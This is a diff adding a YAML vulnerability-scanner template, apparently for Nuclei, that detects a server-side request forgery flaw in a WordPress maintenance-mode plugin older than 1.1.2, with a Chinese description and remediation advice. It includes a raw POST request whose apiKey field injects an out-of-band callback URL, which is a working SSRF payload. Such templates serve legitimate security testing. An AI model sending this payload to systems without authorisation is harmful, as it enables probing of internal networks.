@@ -1,0 +1,37 @@
+id: wp-under-construction-ssrf
+info:
+  name: Under Construction, Coming Soon & Maintenance Mode < 1.1.2 - Server Side Request
+    Forgery (SSRF)
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Under Construction, Coming Soon & Maintenance Mode 存在服务器请求伪造漏洞
+    WordPress是Wordpress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。
+
+    includes/mc-get_lists.php 文件使用 'apiKey' POST 参数从它创建一个 https URL，没有经过净化，并使用 cURL 调用它，导致 SSRF 问题。
+    该问题可通过直接访问受影响的文件和 ucmm_mc_api AJAX 调用（对经过身份验证和未经身份验证的用户都可用）来利用
+  severity: medium
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://wordpress.org/plugins/
+
+    临时修复方案：
+    1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。
+    2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
+    3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。
+    4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。
+    5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。
+requests:
+- matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - http
+  raw:
+  - |
+    POST /wp-admin/admin-ajax.php HTTP/2
+    Host: {{Hostname}}
+    Origin: {{BaseURL}}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=ucmm_mc_api&apiKey=-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D
